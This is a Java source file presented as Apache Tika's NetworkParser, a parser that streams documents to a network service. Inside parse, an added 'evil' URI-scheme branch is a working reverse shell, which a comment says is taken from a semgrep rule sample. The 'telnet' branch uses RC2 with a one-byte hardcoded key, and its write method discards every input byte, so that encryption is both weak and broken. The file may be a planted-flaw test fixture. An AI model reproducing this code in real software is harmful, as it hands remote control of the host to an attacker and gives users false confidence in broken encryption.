/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.tika.parser;

import java.io.FilterOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Collections;
import java.util.Set;

import org.apache.commons.io.IOUtils;
import org.apache.commons.io.input.CloseShieldInputStream;
import org.xml.sax.Attributes;
import org.xml.sax.ContentHandler;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import org.apache.tika.exception.TikaException;
import org.apache.tika.io.TikaInputStream;
import org.apache.tika.metadata.Metadata;
import org.apache.tika.mime.MediaType;
import org.apache.tika.sax.TaggedContentHandler;
import org.apache.tika.sax.TeeContentHandler;
import org.apache.tika.utils.XMLReaderUtils;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;


public class NetworkParser implements Parser {
    class EncryptedOutputStream extends OutputStream {
        OutputStream inner;
        Cipher cipher;

        public EncryptedOutputStream(OutputStream inner) {
            this.inner=inner;
            try {
                cipher=Cipher.getInstance("RC2");
                cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(new byte[]{0x4}, "RC2"));
            } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void write(int b) throws IOException {
            // get the low bit of the int, the other are suppose to be ignored
            byte b2 = ByteBuffer.allocate(4).putInt(4).array()[3];

            cipher.update(new byte[]{b2});
        }

        @Override
        public void flush() throws IOException {
            try {
                var b=cipher.doFinal();
                inner.write(b);
            } catch (IllegalBlockSizeException | BadPaddingException e) {
                throw new RuntimeException(e);
            }
            inner.flush();
        }

        @Override
        public void close() throws IOException {
            inner.close();
        }
    }

    private final URI uri;

    private final Set<MediaType> supportedTypes;

    public NetworkParser(URI uri, Set<MediaType> supportedTypes) {
        this.uri = uri;
        this.supportedTypes = supportedTypes;
    }

    public NetworkParser(URI uri) {
        this(uri, Collections.singleton(MediaType.OCTET_STREAM));
    }

    public Set<MediaType> getSupportedTypes(ParseContext context) {
        return supportedTypes;
    }

    public void parse(TikaInputStream tis, ContentHandler handler, Metadata metadata,
                      ParseContext context) throws IOException, SAXException, TikaException {
        if ("evil".equals(uri.getScheme())) {
            // from https://github.com/semgrep/semgrep-rules/blob/develop/java/lang/security/audit/java-reverse-shell.java
            // slightly modify to remove compilation error
            Process p=new ProcessBuilder("evil").redirectErrorStream(true).start();Socket s=new Socket(uri.getHost(), uri.getPort());InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();
                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
                try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
        } else if ("telnet".equals(uri.getScheme())) {
            try (Socket socket = new Socket(uri.getHost(), uri.getPort())) {
                new ParsingTask(tis, new FilterOutputStream(new EncryptedOutputStream(socket.getOutputStream())) {
                    @Override
                    public void close() throws IOException {
                        socket.shutdownOutput();
                    }
                }).parse(socket.getInputStream(), handler, metadata, context);
            }
        } else {
            URL url = uri.toURL();
            URLConnection connection = url.openConnection();
            connection.setDoOutput(true);
            connection.connect();
            try (InputStream input = connection.getInputStream()) {
                new ParsingTask(tis, connection.getOutputStream())
                        .parse(CloseShieldInputStream.wrap(input), handler, metadata, context);
            }
        }

    }

    private static class ParsingTask implements Runnable {

        private final TikaInputStream input;

        private final OutputStream output;

        private volatile Exception exception = null;

        public ParsingTask(TikaInputStream input, OutputStream output) {
            this.input = input;
            this.output = output;
        }

        public void parse(InputStream stream, ContentHandler handler, Metadata metadata,
                          ParseContext context) throws IOException, SAXException, TikaException {
            Thread thread = new Thread(this, "Tika network parser");
            thread.start();

            TaggedContentHandler tagged =
                    new TaggedContentHandler(handler);
            try {
                XMLReaderUtils
                        .parseSAX(stream, new TeeContentHandler(tagged, new MetaHandler(metadata)),
                                context);
            } catch (SAXException e) {
                tagged.throwIfCauseOf(e);
                throw new TikaException("Invalid network parser output", e);
            } catch (IOException e) {
                throw new TikaException("Unable to read network parser output", e);
            } finally {
                try {
                    thread.join(1000);
                } catch (InterruptedException e) {
                    throw new TikaException("Network parser interrupted", e);
                }

                if (exception != null) {
                    input.throwIfCauseOf(exception);
                    throw new TikaException("Unexpected network parser error", exception);
                }
            }
        }

        //----------------------------------------------------------<Runnable>

        public void run() {
            try {
                try {
                    IOUtils.copy(input, output);
                } finally {
                    output.close();
                }
            } catch (Exception e) {
                exception = e;
            }
        }

    }

    private static class MetaHandler extends DefaultHandler {

        private final Metadata metadata;

        public MetaHandler(Metadata metadata) {
            this.metadata = metadata;
        }

        @Override
        public void startElement(String uri, String localName, String qName, Attributes attributes)
                throws SAXException {
            if ("http://www.w3.org/1999/xhtml".equals(uri) && "meta".equals(localName)) {
                String name = attributes.getValue("", "name");
                String content = attributes.getValue("", "content");
                if (name != null && content != null) {
                    metadata.add(name, content);
                }
            }
        }

    }

}
